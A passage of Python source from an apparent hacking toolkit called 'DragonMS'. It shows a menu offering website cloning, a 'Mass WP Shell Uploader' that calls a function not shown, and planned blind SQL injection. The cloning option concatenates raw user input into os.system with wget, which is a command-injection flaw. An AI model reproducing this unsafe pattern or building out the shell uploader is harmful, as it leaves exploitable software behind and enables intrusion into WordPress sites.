        print(' %s Pentest Tools'%MAIN_LIST('04'))
        print(' %s About US \n'''%MAIN_LIST('00'))
        try:
            x = int(input_drg(promt_choice))
            if (x == 1):
                main()
            elif (x == 2):
                main_tools()
            elif (x == 3):
                some_tools()
            elif (x == 4):
                clear()
                print('''%s
   ____                              __  __ ____  
  |  _ \ _ __ __ _  __ _  ___  _ __ |  \/  / ___| 
  | | | | '__/ _` |/ _` |/ _ \| '_ \| |\/| \___ \ 
  | |_| | | | (_| | (_| | (_) | | | | |  | |___) |
  |____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|____/ 
                   |___/                          
                   '''%fg)
                print(' %s 3-5 Will added in v0.6!\n'%sb)
                print(' %s Website CLoning'%MAIN_LIST('01'))
                print(' %s Mass WP Shell UPloader'%MAIN_LIST('02'))
                print(' %s Blind SQL Injection(v0.6)'%MAIN_LIST('03'))
                print(' %s Google Scanner(v0.6)'%MAIN_LIST('04'))
                print(' %s Google Scrapper(v0.6)\n'%MAIN_LIST('05'))
                try:
                    c = int(input_drg(promt_choice))
                except:
                    print('\n %sChoose from 1-5, please.\n'%fr)
                print('')
                if (c == 1):
                    website = input_drg(' [+] Url: ')
                    os.system('wget -rk '+website)
                    clear()
                    print('File saved at '+website)
                if c == 2:
                    wpup_shell()
                if c == 3:
                    sys.exit('%s%s [!] Cooming Soon!'%(fr,sb))
                if c == 4:
                    sys.exit('%s%s [!] Cooming Soon!'%(fr,sb))
                if c == 5:
                    sys.exit('%s%s [!] Cooming Soon!'%(fr,sb))
                
            elif (x == 0):
                clear()
                about_me()
            else:
                sys.exit(NFound)
        except ValueError:
            sys.exit(NFound)
        except KeyboardInterrupt:
            sys.exit(Aborted)
    except KeyboardInterrupt:
        sys.exit(Aborted)
